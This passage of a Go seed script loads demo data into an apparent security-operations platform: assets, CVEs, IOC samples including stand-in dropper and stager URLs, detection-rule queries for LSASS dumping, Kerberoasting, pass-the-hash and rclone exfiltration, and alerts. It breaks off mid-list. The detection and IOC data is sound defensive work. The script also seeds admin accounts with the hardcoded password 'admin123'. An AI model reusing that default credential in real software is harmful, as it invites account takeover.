package main

import (
	"context"
	"fmt"
	"log"
	"time"
	"xsiam/config"
	"xsiam/db"
	"xsiam/internal/model"
	"xsiam/internal/repository"

	"github.com/arangodb/go-driver/v2/arangodb"
	"golang.org/x/crypto/bcrypt"
)

// logAt returns a time.Time offset from now by -hours.
func logAt(now time.Time, hoursAgo float64) time.Time {
	return now.Add(-time.Duration(hoursAgo * float64(time.Hour)))
}

const tenantID = "t-super"

func ptr[T any](v T) *T { return &v }

// graphCollections are owned by the causality_graph named graph and must not
// be dropped while the graph exists.  They are safe to truncate.
var graphCollections = map[string]bool{
	"causality_nodes": true,
	"causality_edges": true,
}

func truncate(ctx context.Context, database arangodb.Database, cols ...string) {
	for _, col := range cols {
		c, err := database.Collection(ctx, col)
		if err != nil {
			// Collection may not exist yet — that's fine.
			continue
		}
		// Graph-owned collections cannot be dropped; truncate them instead.
		if graphCollections[col] {
			if err := c.Truncate(ctx); err != nil {
				fmt.Printf("warn truncate %s: %v\n", col, err)
			} else {
				fmt.Printf("truncated %s\n", col)
			}
			continue
		}
		// For all other collections, drop and recreate to eliminate any
		// leftover schema validators that would conflict with seed documents.
		if dropErr := c.Remove(ctx); dropErr != nil {
			fmt.Printf("warn drop %s: %v\n", col, dropErr)
			continue
		}
		_, createErr := database.CreateCollection(ctx, col, &arangodb.CreateCollectionProperties{})
		if createErr != nil {
			fmt.Printf("warn recreate %s: %v\n", col, createErr)
		} else {
			fmt.Printf("reset %s\n", col)
		}
	}
}

func must(label string, err error) {
	if err != nil {
		log.Fatalf("seed %s: %v", label, err)
	}
}

func main() {
	cfg := config.Load()
	client, err := db.Connect(cfg.ArangoDB.Endpoints, cfg.ArangoDB.Username, cfg.ArangoDB.Password)
	if err != nil {
		log.Fatalf("connect ArangoDB: %v", err)
	}
	ctx := context.Background()
	database, err := db.Database(ctx, client, cfg.ArangoDB.Database)
	if err != nil {
		log.Fatalf("open database: %v", err)
	}

	truncate(ctx, database,
		"alerts", "incidents", "assets", "vulnerabilities", "iocs", "intel_feeds",
		"detection_rules", "devices", "playbooks", "actions",
		"users", "tenants", "rbac_roles",
		"causality_nodes", "causality_edges", "audit_logs",
		"log_entries",
		"identity_risks", "exposure_scores",
		"reports", "agent_policies", "datasources",
	)

	tenantRepo      := repository.NewTenantRepo(database)
	userRepo        := repository.NewUserRepo(database)
	rbacRepo        := repository.NewRBACRoleRepo(database)
	alertRepo       := repository.NewAlertRepo(database)
	incRepo         := repository.NewIncidentRepo(database)
	assetRepo       := repository.NewAssetRepo(database)
	vulnRepo        := repository.NewVulnerabilityRepo(database)
	iocRepo         := repository.NewIocRepo(database)
	feedRepo        := repository.NewIntelFeedRepo(database)
	deviceRepo      := repository.NewDeviceRepo(database)
	ruleRepo        := repository.NewDetectionRuleRepo(database)
	pbRepo          := repository.NewPlaybookRepo(database)
	actionRepo      := repository.NewActionRepo(database)
	identityRepo    := repository.NewIdentityRiskRepo(database)
	exposureRepo    := repository.NewExposureScoreRepo(database)
	causalityRepo   := repository.NewCausalityGraphRepo(database)
	reportRepo      := repository.NewReportRepo(database)
	policyRepo      := repository.NewAgentPolicyRepo(database)
	dsRepo          := repository.NewDataSourceRepo(database)

	now := time.Now()

	// ── 1. Tenant ──────────────────────────────────────────────────────────
	superTenant := &model.Tenant{
		TenantID: tenantID, TenantCode: "SUPER", Name: "Acme Security SOC",
		Tier: model.TenantTierSuper, IsEnabled: true,
		Settings: model.TenantSettings{LogRetentionDays: 90, MaxUsers: 9999, AllowCustomRules: true},
	}
	must("tenant", tenantRepo.Create(ctx, superTenant))

	// ── 2. Users ───────────────────────────────────────────────────────────
	hash, _ := bcrypt.GenerateFromPassword([]byte("admin123"), bcrypt.DefaultCost)
	adminUser := &model.User{
		TenantID: tenantID, Username: "admin", Email: "admin",
		PasswordHash: string(hash), Role: model.UserRoleAdmin,
		DisplayName: "Alice Chen", IsEnabled: true,
	}
	must("admin user", userRepo.Create(ctx, adminUser))
	analyst := &model.User{
		TenantID: tenantID, Username: "bob", Email: "bob",
		PasswordHash: string(hash), Role: model.UserRoleAnalyst,
		DisplayName: "Bob Martinez", IsEnabled: true,
	}
	must("analyst", userRepo.Create(ctx, analyst))

	// ── 3. RBAC ────────────────────────────────────────────────────────────
	for _, role := range []model.RBACRole{
		{RoleID: "role-admin", TenantID: tenantID, Name: "Admin", Permissions: []string{"*:*"}, IsBuiltin: true, Members: []string{adminUser.Key}},
		{RoleID: "role-analyst", TenantID: tenantID, Name: "Security Analyst", IsBuiltin: true,
			Permissions: []string{"alerts:read", "alerts:update", "incidents:read", "incidents:update", "assets:read", "vulnerabilities:read"}},
	} {
		r := role
		must("role "+r.Name, rbacRepo.Create(ctx, &r))
	}

	// ── 4. Assets — cover every AssetType + status + OS ───────────────────
	// Types: server, workstation, network, cloud, iot
	// Status: online, offline, isolated, uninstalled
	type assetSpec struct {
		name, ip, os, status string
		typ                  model.AssetType
		risk                 float64
		tags                 []string
	}
	assetSpecs := []assetSpec{
		{"WKSTN-047", "10.1.2.47", "Windows 11 22H2", "online", model.AssetTypeWorkstation, 82, []string{"finance", "critical"}},
		{"SRV-DB-03", "10.1.5.3", "Ubuntu 22.04 LTS", "online", model.AssetTypeServer, 91, []string{"database", "pii"}},
		{"DC-PROD-01", "10.0.0.1", "Windows Server 2022", "online", model.AssetTypeServer, 95, []string{"domain-controller", "critical"}},
		{"WEB-FRONT-02", "10.2.1.20", "CentOS 8.5", "online", model.AssetTypeServer, 55, []string{"web", "dmz"}},
		{"LAPTOP-CEO-01", "10.1.0.5", "macOS 14.4 Sonoma", "online", model.AssetTypeWorkstation, 74, []string{"executive", "critical"}},
		{"SRV-APP-07", "10.1.4.7", "Windows Server 2019", "online", model.AssetTypeServer, 48, []string{"app-server"}},
		{"KIOSK-LOBBY-01", "10.3.0.10", "Windows 10 21H2", "offline", model.AssetTypeWorkstation, 32, []string{"kiosk"}},
		{"NAS-BACKUP-01", "10.1.8.1", "FreeNAS 13.0", "online", model.AssetTypeServer, 67, []string{"storage", "backup"}},
		{"FIREWALL-EXT-01", "203.0.113.1", "PAN-OS 11.1", "online", model.AssetTypeNetwork, 40, []string{"perimeter", "firewall"}},
		{"SRV-MAIL-01", "10.1.6.2", "Windows Server 2019", "online", model.AssetTypeServer, 58, []string{"mail", "exchange"}},
		// cloud asset
		{"aws-prod-vpc", "172.31.0.0/16", "AWS VPC", "online", model.AssetTypeCloud, 61, []string{"cloud", "aws", "prod"}},
		// iot asset
		{"CCTV-LOBBY-01", "10.3.1.5", "Embedded Linux", "online", model.AssetTypeIoT, 28, []string{"iot", "camera"}},
		// isolated asset
		{"WKSTN-QUARANTINE", "10.1.2.99", "Windows 11", "isolated", model.AssetTypeWorkstation, 98, []string{"quarantine", "infected"}},
	}
	assets := make([]*model.Asset, len(assetSpecs))
	assetKeys := make([]string, len(assetSpecs))
	for i, s := range assetSpecs {
		a := &model.Asset{
			TenantID: tenantID, Name: s.name, Identifier: s.name,
			IPAddresses: []string{s.ip}, OSInfo: model.OSInfo{Name: s.os},
			Type: s.typ, RiskScore: s.risk, Tags: s.tags,
			Hostname: s.name, IP: s.ip, OS: s.os, Status: s.status,
			LastSeen: now, CreatedAt: now.Add(-time.Duration(i+1) * 24 * time.Hour), UpdatedAt: now,
		}
		must("asset "+s.name, assetRepo.Create(ctx, a))
		assets[i] = a
		assetKeys[i] = a.Key
	}
	fmt.Printf("seeded %d assets\n", len(assetSpecs))

	// ── 5. Vulnerabilities — cover every severity + fix_status ─────────────
	// fix_status: open, in_progress, fixed, accepted_risk
	type vulnSpec struct {
		cve, title    string
		sev           model.VulnSeverity
		cvss          float64
		assetIdxs     []int
		fix           model.VulnFixStatus
		wild          bool
		priorityScore float64
	}
	vulnSpecs := []vulnSpec{
		{"CVE-2024-21413", "Microsoft Outlook RCE via NTLM relay", model.VulnSeverityCritical, 9.8, []int{0, 4}, model.VulnFixStatusOpen, true, 98},
		{"CVE-2024-3094", "XZ Utils backdoor in liblzma", model.VulnSeverityCritical, 10.0, []int{1}, model.VulnFixStatusInProgress, true, 95},
		{"CVE-2024-1709", "ConnectWise ScreenConnect auth bypass", model.VulnSeverityCritical, 10.0, []int{2}, model.VulnFixStatusFixed, false, 72},
		{"CVE-2024-27198", "JetBrains TeamCity auth bypass", model.VulnSeverityHigh, 9.8, []int{5}, model.VulnFixStatusOpen, false, 84},
		{"CVE-2024-20353", "Cisco ASA DoS via malformed TLS", model.VulnSeverityHigh, 8.6, []int{8}, model.VulnFixStatusAccepted, false, 41},
		{"CVE-2023-44487", "HTTP/2 Rapid Reset DDoS amplification", model.VulnSeverityHigh, 7.5, []int{3, 5}, model.VulnFixStatusFixed, false, 38},
		{"CVE-2024-6387", "OpenSSH RegreSSHion RCE race condition", model.VulnSeverityCritical, 8.1, []int{1, 5}, model.VulnFixStatusOpen, true, 91},
		{"CVE-2024-30078", "Windows WiFi Driver RCE", model.VulnSeverityHigh, 8.8, []int{0, 4, 6}, model.VulnFixStatusInProgress, false, 77},
		{"CVE-2023-38831", "WinRAR code execution vulnerability", model.VulnSeverityMedium, 7.8, []int{0}, model.VulnFixStatusFixed, true, 45},
		{"CVE-2024-26169", "Windows Error Reporting privilege escalation", model.VulnSeverityMedium, 7.8, []int{2, 5}, model.VulnFixStatusOpen, false, 52},
		{"CVE-2022-47966", "Zoho ManageEngine RCE", model.VulnSeverityLow, 3.9, []int{7}, model.VulnFixStatusAccepted, false, 18},
	}
	for i, s := range vulnSpecs {
		affectedIDs := make([]string, len(s.assetIdxs))
		affectedNames := make([]string, len(s.assetIdxs))
		for j, idx := range s.assetIdxs {
			affectedIDs[j] = assetKeys[idx]
			affectedNames[j] = assetSpecs[idx].name
		}
		v := &model.Vulnerability{
			TenantID: tenantID, CveID: s.cve, Title: s.title,
			Severity: s.sev, CvssScore: s.cvss,
			AffectedAssetIDs: affectedIDs, FixStatus: s.fix,
			ExploitedInWild: s.wild, PriorityScore: s.priorityScore,
			Status: string(s.fix), AffectedAssets: affectedNames,
			PublishedAt: now.Add(-time.Duration(i+30) * 24 * time.Hour),
			CreatedAt: now.Add(-time.Duration(i+1) * 24 * time.Hour), UpdatedAt: now,
		}
		must("vuln "+s.cve, vulnRepo.Create(ctx, v))
	}
	fmt.Printf("seeded %d vulnerabilities\n", len(vulnSpecs))

	// ── 6. IOCs — cover every type + verdict ──────────────────────────────
	// types: ip, domain, url, hash, email  (model supports these 5)
	// verdict: malicious, suspicious, benign, unknown
	type iocSpec struct {
		typ        model.IOCType
		value      string
		verdict    model.IOCVerdict
		conf       float64
		source     string
		threatName string
		severity   string
		tags       []string
		active     bool
	}
	iocSpecs := []iocSpec{
		{model.IOCTypeIP, "185.220.101.15", model.IOCVerdictMalicious, 98, "Unit 42", "TOR Exit Node C2", "critical", []string{"c2", "tor-exit"}, true},
		{model.IOCTypeIP, "91.241.19.55", model.IOCVerdictSuspicious, 70, "Emerging Threats", "Port Scanner", "medium", []string{"scanner", "recon"}, true},
		{model.IOCTypeIP, "45.132.192.61", model.IOCVerdictSuspicious, 65, "AlienVault OTX", "Suspicious Proxy", "medium", []string{"proxy"}, true},
		{model.IOCTypeIP, "8.8.8.8", model.IOCVerdictBenign, 100, "Manual Allowlist", "Google DNS", "info", []string{"allowlist", "dns"}, true},
		{model.IOCTypeIP, "192.0.2.44", model.IOCVerdictUnknown, 30, "Abuse.ch", "Unclassified Scanner", "low", []string{"scanner"}, true},
		{model.IOCTypeDomain, "evil-c2.ru", model.IOCVerdictMalicious, 99, "Unit 42", "APT C2 Domain", "critical", []string{"c2", "apt"}, true},
		{model.IOCTypeDomain, "updates-win32.com", model.IOCVerdictSuspicious, 80, "PhishFeed", "Phishing Infrastructure", "high", []string{"phishing"}, true},
		{model.IOCTypeDomain, "google.com", model.IOCVerdictBenign, 100, "Manual Allowlist", "Google", "info", []string{"allowlist"}, true},
		{model.IOCTypeDomain, "cdn-stats24.net", model.IOCVerdictUnknown, 25, "MISP", "Unverified Domain", "low", []string{"unverified"}, true},
		{model.IOCTypeURL, "https://cdn-updates.evil-c2.ru/payload.exe", model.IOCVerdictMalicious, 98, "WildFire", "Dropper URL", "critical", []string{"dropper", "malware"}, true},
		{model.IOCTypeURL, "http://suspicious-redirect.biz/track", model.IOCVerdictSuspicious, 60, "URLhaus", "Redirect Chain", "medium", []string{"redirect"}, true},
		{model.IOCTypeHash, "a1b2c3d4e5f6789012345678901234567890abcd", model.IOCVerdictMalicious, 100, "WildFire", "LockBit Ransomware", "critical", []string{"ransomware", "lockbit"}, true},
		{model.IOCTypeHash, "deadbeef1234567890abcdef1234567890abcdef", model.IOCVerdictMalicious, 100, "WildFire", "Rclone Backdoor", "high", []string{"backdoor", "rclone"}, true},
		{model.IOCTypeHash, "cafebabe1234567890abcdef1234567890abcdef", model.IOCVerdictSuspicious, 72, "WildFire", "Mimikatz Variant", "high", []string{"credential-theft"}, true},
		{model.IOCTypeHash, "aabbccdd1234567890123456789012345678abcd", model.IOCVerdictUnknown, 40, "MISP", "Unclassified Binary", "low", []string{"unknown"}, true},
		{model.IOCTypeEmail, "phish@secure-login.evil.com", model.IOCVerdictMalicious, 92, "PhishFeed", "Phishing Sender", "high", []string{"phishing", "email"}, true},
		{model.IOCTypeEmail, "noreply@legit-corp.com", model.IOCVerdictBenign, 95, "Manual Allowlist", "Corporate No-Reply", "info", []string{"allowlist"}, true},
		{model.IOCTypeEmail, "unknown-sender@tempmail.xyz", model.IOCVerdictUnknown, 35, "MISP", "Unknown Sender", "low", []string{"unverified"}, true},

		// ── additional IOCs ────────────────────────────────────────────────────
		// ip / malicious
		{model.IOCTypeIP, "194.165.16.72", model.IOCVerdictMalicious, 97, "Unit 42", "Cobalt Strike Team Server", "critical", []string{"c2", "cobalt-strike"}, true},
		// ip / suspicious
		{model.IOCTypeIP, "5.188.206.14", model.IOCVerdictSuspicious, 73, "Emerging Threats", "RDP Brute Force Source", "high", []string{"brute-force", "rdp"}, true},
		// ip / unknown
		{model.IOCTypeIP, "103.21.244.0", model.IOCVerdictUnknown, 40, "Abuse.ch", "Unclassified Proxy", "low", []string{"proxy", "unverified"}, true},
		// domain / malicious
		{model.IOCTypeDomain, "secure-payments-verify.biz", model.IOCVerdictMalicious, 95, "PhishFeed", "Credit Card Phishing Domain", "critical", []string{"phishing", "financial"}, true},
		// domain / suspicious
		{model.IOCTypeDomain, "windowsupdate-cdn.net", model.IOCVerdictSuspicious, 78, "AlienVault OTX", "Typosquatting Update Domain", "high", []string{"typosquatting", "masquerading"}, true},
		// url / malicious
		{model.IOCTypeURL, "http://194.165.16.72:8080/stager.bin", model.IOCVerdictMalicious, 99, "WildFire", "Cobalt Strike Stager", "critical", []string{"cobalt-strike", "stager"}, true},
		// url / suspicious
		{model.IOCTypeURL, "https://pastebin.com/raw/xK7mP2qR", model.IOCVerdictSuspicious, 62, "URLhaus", "Paste-based Payload Delivery", "medium", []string{"paste-site", "dropper"}, true},
		// hash / malicious
		{model.IOCTypeHash, "1122334455667788aabbccddeeff00112233445566778899aabbccddeeff0011", model.IOCVerdictMalicious, 100, "WildFire", "BlackCat/ALPHV Ransomware", "critical", []string{"ransomware", "blackcat"}, true},
		// hash / suspicious
		{model.IOCTypeHash, "aabbccddeeff00112233445566778899aabbccddeeff001122334455667788aa", model.IOCVerdictSuspicious, 68, "MISP", "Suspected Loader Dropper", "high", []string{"loader", "dropper"}, true},
		// hash / unknown
		{model.IOCTypeHash, "deadc0de1234567890abcdef1234567890abcdef1234567890abcdef12345678", model.IOCVerdictUnknown, 45, "MISP", "Unclassified PE Binary", "low", []string{"unknown", "pe-file"}, true},
	}
	for i, s := range iocSpecs {
		ioc := &model.IOC{
			TenantID: tenantID, Type: s.typ, Value: s.value,
			Verdict: s.verdict, Confidence: s.conf, SourceName: s.source,
			Tags: s.tags, IsActive: s.active,
			ThreatName: s.threatName, Active: s.active, Severity: s.severity,
			CreatedAt: now.Add(-time.Duration(i+1) * 24 * time.Hour), UpdatedAt: now,
		}
		must("ioc "+ioc.Value, iocRepo.Create(ctx, ioc))
	}
	fmt.Printf("seeded %d iocs\n", len(iocSpecs))

	// ── 7. Intel Feeds — cover every feed_type + status ───────────────────
	// feed_type: unit42, wildfire, misp, stix_taxii, mitre, virustotal, custom
	// status: active, inactive, error, syncing
	type feedSpec struct {
		name, desc, feedType, url string
		status                    model.FeedStatus
		iocCount                  int64
		syncInterval, minsAgo     int
	}
	feedSpecs := []feedSpec{
		{"Unit 42 Intelligence", "Palo Alto Networks Unit 42 threat research — APT groups, malware families, TTPs", "unit42", "https://autofocus.paloaltonetworks.com/api/v1.0/feed", model.FeedStatusActive, 1247, 1, 4},
		{"WildFire", "Palo Alto Networks WildFire cloud malware analysis verdicts and file hashes", "wildfire", "https://wildfire.paloaltonetworks.com/publicapi/feed", model.FeedStatusActive, 842, 1, 12},
		{"MISP Community Feed", "Open-source community threat intelligence from MISP sharing platform", "misp", "https://misp.feed.community/feed.json", model.FeedStatusActive, 3421, 1, 61},
		{"STIX/TAXII Enterprise", "STIX 2.1 / TAXII 2.1 enterprise threat sharing hub", "stix_taxii", "https://taxii.example.com/api/v21/collections/enterprise/", model.FeedStatusActive, 5810, 2, 35},
		{"MITRE ATT&CK", "MITRE ATT&CK Enterprise techniques and sub-techniques", "mitre", "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json", model.FeedStatusActive, 742, 24, 90},
		{"VirusTotal Premium", "VirusTotal file/URL reputation and malware intelligence", "virustotal", "https://www.virustotal.com/api/v3/feeds/files", model.FeedStatusError, 22483, 1, 8},
		{"Emerging Threats Pro", "Proofpoint ET Pro ruleset with IP/domain reputation", "custom", "https://rules.emergingthreats.net/open/suricata/emerging.rules.tar.gz", model.FeedStatusInactive, 12847, 6, 183},
		{"Abuse.ch URLhaus", "URLhaus malicious URL database — phishing, malware hosting, C2", "custom", "https://urlhaus-api.abuse.ch/v1/urls/recent/", model.FeedStatusActive, 5612, 1, 8},
		{"AlienVault OTX", "Open Threat Exchange community pulses — global threat indicators", "custom", "https://otx.alienvault.com/api/v1/pulses/subscribed", model.FeedStatusActive, 9183, 2, 23},
	}
	for i, s := range feedSpecs {
		syncedAt := now.Add(-time.Duration(s.minsAgo) * time.Minute)
		f := &model.IntelFeed{
			TenantID: tenantID, Name: s.name, Description: s.desc,
			FeedType: s.feedType, URL: s.url, Status: s.status,
			IOCCount: s.iocCount, AutoSync: s.status == model.FeedStatusActive,
			SyncInterval: s.syncInterval, LastSyncAt: &syncedAt,
			CreatedAt: now.Add(-time.Duration(i+30) * 24 * time.Hour), UpdatedAt: syncedAt,
		}
		must("feed "+s.name, feedRepo.Create(ctx, f))
	}
	fmt.Printf("seeded %d intel feeds\n", len(feedSpecs))

	// ── 8. Detection Rules — cover every type + status ────────────────────
	// type: bioc, ioc, ueba  |  status: draft, testing, active, disabled, deprecated
	type ruleSpec struct {
		name, desc    string
		ruleType      model.RuleType
		status        model.RuleStatus
		severity      model.Severity
		tactic, tech  string
		query         string
		hoursAgo      int
		hits          int64
	}
	ruleSpecs := []ruleSpec{
		// idx 0 — bioc/active
		{"PowerShell Encoded Command Execution", "Detects encoded PowerShell commands commonly used to evade detection.",
			model.RuleTypeBIOC, model.RuleStatusActive, model.SeverityHigh, "execution", "T1059.001",
			`dataset=endpoint_events | where process_name="powershell.exe" and cmdline contains "-enc" | stats count() by host, user | where count > 3`, 72, 847},
		// idx 1 — bioc/active
		{"LSASS Memory Dump via Task Manager", "Detects LSASS memory access for credential extraction.",
			model.RuleTypeBIOC, model.RuleStatusActive, model.SeverityCritical, "credential-access", "T1003.001",
			`dataset=endpoint_events | where target_process="lsass.exe" and action="memory_access" | alert on each`, 60, 312},
		// idx 2 — bioc/active
		{"Suspicious Outbound DNS to DGA Domains", "Identifies DNS queries to algorithmically generated domains (C2 beaconing).",
			model.RuleTypeBIOC, model.RuleStatusActive, model.SeverityMedium, "command-and-control", "T1568.002",
			`dataset=dns_logs | where entropy(query) > 3.5 and query_type="A" | stats count() by src_ip | where count > 50`, 48, 1203},
		// idx 3 — bioc/active
		{"Lateral Movement via SMB Admin Share", "Detects use of ADMIN$, C$ for lateral movement.",
			model.RuleTypeBIOC, model.RuleStatusActive, model.SeverityHigh, "lateral-movement", "T1021.002",
			`dataset=network_events | where proto="smb" and share in ("ADMIN$","C$","IPC$") and direction="outbound" | stats dc(dst_ip) by src_ip | where dc > 3`, 36, 524},
		// idx 4 — bioc/active
		{"Ransomware File Encryption Pattern", "Detects mass file rename/overwrite consistent with ransomware.",
			model.RuleTypeBIOC, model.RuleStatusActive, model.SeverityCritical, "impact", "T1486",
			`dataset=file_events | where action="rename" and new_ext in (".locked",".encrypted",".enc",".lck") | stats count() by host | where count > 20`, 24, 89},
		// idx 5 — bioc/active
		{"Kerberoasting Activity", "Detects Kerberos TGS requests for service accounts.",
			model.RuleTypeBIOC, model.RuleStatusActive, model.SeverityHigh, "credential-access", "T1558.003",
			`dataset=auth_events | where auth_type="kerberos" and ticket_type="TGS" and encryption_type="rc4-hmac" | stats count() by src_user, src_ip | where count > 5`, 120, 67},
		// idx 6 — bioc/active
		{"New Privileged Account Created", "Alerts when user added to privileged groups.",
			model.RuleTypeBIOC, model.RuleStatusActive, model.SeverityHigh, "privilege-escalation", "T1136.002",
			`dataset=identity_events | where action="group_add" and group in ("Domain Admins","Administrators","Enterprise Admins")`, 168, 42},
		// idx 7 — ioc/active
		{"C2 Beacon to Known Malicious IP", "Matches outbound connections against threat intel IOC list.",
			model.RuleTypeIOC, model.RuleStatusActive, model.SeverityCritical, "command-and-control", "T1071.001",
			`dataset=network_events | lookup threat_intel on dst_ip | where verdict="malicious" | alert`, 96, 231},
		// idx 8 — bioc/testing
		{"WMI Persistence via Scheduled Task", "Detects scheduled task creation via WMI.",
			model.RuleTypeBIOC, model.RuleStatusTesting, model.SeverityMedium, "persistence", "T1053.005",
			`dataset=endpoint_events | where process_name="wmiprvse.exe" and child_process="schtasks.exe"`, 144, 18},
		// idx 9 — bioc/active
		{"Large Outbound Data Transfer", "Detects unusually large outbound transfers (exfiltration).",
			model.RuleTypeBIOC, model.RuleStatusActive, model.SeverityHigh, "exfiltration", "T1048",
			`dataset=network_events | where direction="outbound" and bytes_out > 1073741824 | stats sum(bytes_out) by src_ip, dst_ip | where sum > 5368709120`, 200, 156},
		// idx 10 — bioc/active
		{"Pass-the-Hash Detection", "Identifies NTLM auth using stolen hashes.",
			model.RuleTypeBIOC, model.RuleStatusActive, model.SeverityCritical, "lateral-movement", "T1550.002",
			`dataset=auth_events | where auth_type="ntlm" and logon_type=3 and src_ip != dst_ip and user not in ("anonymous","guest")`, 80, 193},
		// idx 11 — bioc/active
		{"Rclone Exfiltration Tool Execution", "Detects rclone execution for cloud storage exfiltration.",
			model.RuleTypeBIOC, model.RuleStatusActive, model.SeverityHigh, "exfiltration", "T1567.002",
			`dataset=endpoint_events | where process_name="rclone.exe" or (cmdline contains "rclone" and cmdline contains "copy")`, 56, 74},
		// idx 12 — bioc/testing
		{"Exchange Mailbox Export Unauthorized", "Detects unauthorized Exchange PST exports.",
			model.RuleTypeBIOC, model.RuleStatusTesting, model.SeverityHigh, "collection", "T1114.002",
			`dataset=endpoint_events | where process_name in ("exmerge.exe","powershell.exe") and cmdline contains "Export-Mailbox"`, 240, 11},
		// idx 13 — ueba/active
		{"Abnormal Login Hours (UEBA)", "Flags logins outside user's historical baseline hours.",
			model.RuleTypeUEBA, model.RuleStatusActive, model.SeverityMedium, "initial-access", "T1078",
			`dataset=auth_events | baseline user_login_hours by user over 30d | where hour not in baseline_range(user, 2)`, 300, 438},
		// idx 14 — bioc/draft
		{"Suspicious Registry Run Key", "Detects additions to autorun registry keys.",
			model.RuleTypeBIOC, model.RuleStatusDraft, model.SeverityMedium, "persistence", "T1547.001",
			`dataset=registry_events | where key contains "\\CurrentVersion\\Run" and action="set_value"`, 400, 0},
		// idx 15 — ioc/active
		{"Known Malicious File Hash Block", "Blocks execution of files matching known malware hashes.",
			model.RuleTypeIOC, model.RuleStatusActive, model.SeverityCritical, "defense-evasion", "T1027",
			`dataset=endpoint_events | lookup malware_hashes on file_hash | where verdict="malicious" | block`, 48, 621},
		// idx 16 — ueba/testing
		{"Impossible Travel Detection (UEBA)", "Flags logins from geographically impossible locations.",
			model.RuleTypeUEBA, model.RuleStatusTesting, model.SeverityHigh, "initial-access", "T1078.004",
			`dataset=auth_events | baseline user_geo by user over 7d | where geo_distance(prev_login_geo, current_geo) > 800 and time_diff < 3h`, 120, 27},
		// idx 17 — bioc/disabled
		{"Legacy SMBv1 Usage Detection", "Detects SMBv1 protocol usage (deprecated, disabled rule).",
			model.RuleTypeBIOC, model.RuleStatusDisabled, model.SeverityLow, "lateral-movement", "T1021.002",
			`dataset=network_events | where proto="smb" and smb_version=1`, 720, 0},
		// idx 18 — bioc/deprecated (shows deprecated badge)
		{"Old Mimikatz Hash Signature", "Legacy Mimikatz detection — superseded by behavioral rule.",
			model.RuleTypeBIOC, model.RuleStatusDeprecated, model.SeverityHigh, "credential-access", "T1003",
			`dataset=endpoint_events | where file_hash in ("legacy_hash_list")`, 1440, 0},
	}
	var ruleKeys []string
	for i, s := range ruleSpecs {
		r := &model.DetectionRule{
			RuleID: fmt.Sprintf("RULE-%05d", i+1), TenantID: tenantID,
			Name: s.name, Description: s.desc,
			RuleType: s.ruleType, Status: s.status, Severity: s.severity,
			MitreTactic: s.tactic, MitreTechnique: s.tech,
			MitreTactics: []string{s.tactic}, MitreTechniques: []string{s.tech},
			Query: s.query, HitCount: s.hits, CreatedBy: "admin",
			CreatedAt: now.Add(-time.Duration(s.hoursAgo) * time.Hour), UpdatedAt: now,
		}
		must("rule "+s.name, ruleRepo.Create(ctx, r))
		ruleKeys = append(ruleKeys, r.Key)
	}
	fmt.Printf("seeded %d detection rules\n", len(ruleSpecs))
	ruleName := func(i int) string {
		if i >= 0 && i < len(ruleSpecs) { return ruleSpecs[i].name }
		return ""
	}

	// ── 9. Alerts — cover every severity + status + source ────────────────
	// severity: critical, high, medium, low
	// status: active, investigating, resolved, false_positive, auto_closed
	// source: endpoint, network, identity, cloud, email, syslog
	alertRepo.EnsureIndexes(ctx)
	type alertSpec struct {
		name, host, user, tactic string
		sev                      model.Severity
		src                      model.SourceType
		status                   model.AlertStatus
		hoursAgo, ruleIdx        int
	}
	alertSpecs := []alertSpec{
		// critical + active
		{"Suspicious PowerShell encoded command execution", "WKSTN-047", "jdoe", "Execution", model.SeverityCritical, model.SourceEndpoint, model.AlertStatusActive, 2, 0},
		{"NTLM relay attack detected from workstation", "WKSTN-047", "jdoe", "Lateral Movement", model.SeverityCritical, model.SourceNetwork, model.AlertStatusActive, 3, 10},
		{"Rclone.exe data exfiltration to external storage", "WKSTN-047", "jdoe", "Exfiltration", model.SeverityCritical, model.SourceEndpoint, model.AlertStatusActive, 4, 11},
		{"Process injection into lsass.exe", "SRV-DB-03", "system", "Credential Access", model.SeverityCritical, model.SourceEndpoint, model.AlertStatusActive, 6, 1},
		{"Ransomware file encryption pattern detected", "WKSTN-047", "jdoe", "Impact", model.SeverityCritical, model.SourceEndpoint, model.AlertStatusActive, 8, 4},
		{"C2 beacon to 185.220.101.15 detected", "WKSTN-047", "jdoe", "Command and Control", model.SeverityCritical, model.SourceNetwork, model.AlertStatusActive, 11, 7},
		{"Mimikatz credential dumping tool detected", "SRV-DB-03", "system", "Credential Access", model.SeverityCritical, model.SourceEndpoint, model.AlertStatusActive, 14, 1},
		{"Pass-the-hash detected from endpoint", "WKSTN-047", "jdoe", "Lateral Movement", model.SeverityCritical, model.SourceEndpoint, model.AlertStatusActive, 30, 10},
		// high + active
		{"Admin account login outside business hours", "DC-PROD-01", "admin", "Initial Access", model.SeverityHigh, model.SourceIdentity, model.AlertStatusActive, 5, 13},
		{"Lateral movement via SMB admin share access", "SRV-DB-03", "jdoe", "Lateral Movement", model.SeverityHigh, model.SourceNetwork, model.AlertStatusActive, 7, 3},
		{"Phishing email with malicious attachment opened", "LAPTOP-CEO-01", "ceo", "Initial Access", model.SeverityHigh, model.SourceEmail, model.AlertStatusActive, 10, -1},
		{"WMI persistence — new scheduled task created", "DC-PROD-01", "system", "Persistence", model.SeverityHigh, model.SourceEndpoint, model.AlertStatusActive, 12, 8},
		{"New privileged user created without approval", "DC-PROD-01", "admin", "Privilege Escalation", model.SeverityHigh, model.SourceIdentity, model.AlertStatusActive, 18, 6},
		{"Firewall rule disabled on perimeter device", "FIREWALL-EXT-01", "admin", "Defense Evasion", model.SeverityHigh, model.SourceNetwork, model.AlertStatusActive, 20, -1},
		{"Large data transfer to cloud storage (>5GB)", "SRV-APP-07", "svc-backup", "Exfiltration", model.SeverityHigh, model.SourceCloud, model.AlertStatusActive, 22, 9},
		{"Exchange mailbox export to PST — unauthorized", "SRV-MAIL-01", "admin", "Collection", model.SeverityHigh, model.SourceEmail, model.AlertStatusActive, 26, 12},
		{"Kerberoasting attack detected", "DC-PROD-01", "jdoe", "Credential Access", model.SeverityHigh, model.SourceIdentity, model.AlertStatusActive, 28, 5},
		// medium + active
		{"Suspicious outbound DNS — possible DGA traffic", "WEB-FRONT-02", "", "Command and Control", model.SeverityMedium, model.SourceNetwork, model.AlertStatusActive, 15, 2},
		{"Brute force login attempt — 147 failures", "SRV-MAIL-01", "", "Credential Access", model.SeverityMedium, model.SourceIdentity, model.AlertStatusActive, 24, 13},
		{"Suspicious registry run key added", "LAPTOP-CEO-01", "ceo", "Persistence", model.SeverityMedium, model.SourceEndpoint, model.AlertStatusActive, 36, 14},
		{"Port scan detected from internal host", "SRV-APP-07", "", "Discovery", model.SeverityMedium, model.SourceNetwork, model.AlertStatusActive, 48, -1},
